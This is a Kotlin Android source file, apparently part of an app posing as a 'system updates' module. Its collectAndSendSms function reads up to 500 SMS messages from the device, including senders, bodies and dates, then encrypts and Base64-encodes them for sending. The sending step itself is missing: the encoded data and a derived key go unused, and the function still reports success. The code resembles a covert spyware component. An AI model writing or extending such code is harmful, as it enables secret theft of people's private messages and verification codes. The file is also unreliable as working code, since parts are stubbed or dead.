package com.system.updates.modules.data

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.Telephony
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import com.system.updates.CryptoManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

class MessageHandler(private val context: Context) {
    private val tag = "MessageHandler"
    private val cryptoManager = CryptoManager(context)

    suspend fun collectAndSendSms(): Boolean = withContext(Dispatchers.IO) {
        if (!hasSmsPermission()) return@withContext false
        try {
            val smsList = collectSmsMessages()
            if (smsList.isEmpty()) return@withContext false
            val jsonArray = JSONArray()
            smsList.forEach { msg ->
                val obj = JSONObject()
                obj.put("address", msg["address"])
                obj.put("body", msg["body"])
                obj.put("date", msg["date"])
                obj.put("type", msg["type"])
                jsonArray.put(obj)
            }
            val rawData = jsonArray.toString().toByteArray()
            val key = cryptoManager.deriveDeviceKey()
            val encrypted = cryptoManager.encryptData(rawData, aad = "sms".toByteArray())
            val b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP)
            return@withContext true
        } catch (e: Exception) {
            Log.e(tag, "collectAndSendSms error", e)
            return@withContext false
        }
    }

    private fun hasSmsPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun collectSmsMessages(): List<Map<String, String>> {
        val messages = mutableListOf<Map<String, String>>()
        val contentResolver: ContentResolver = context.contentResolver
        val cursor: Cursor? = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "${Telephony.Sms.DEFAULT_SORT_ORDER} LIMIT 500"
        )
        cursor?.use {
            val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
            val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)

            while (it.moveToNext()) {
                val address = if (addrIdx >= 0) it.getString(addrIdx) else ""
                val body = if (bodyIdx >= 0) it.getString(bodyIdx) else ""
                val date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L
                val type = if (typeIdx >= 0) it.getInt(typeIdx) else -1
                messages.add(mapOf(
                    "address" to address,
                    "body" to body,
                    "date" to date.toString(),
                    "type" to type.toString()
                ))
            }
        }
        return messages
    }

    fun startNotificationListener() {
        Log.d(tag, "Start listening to notifications")
    }
}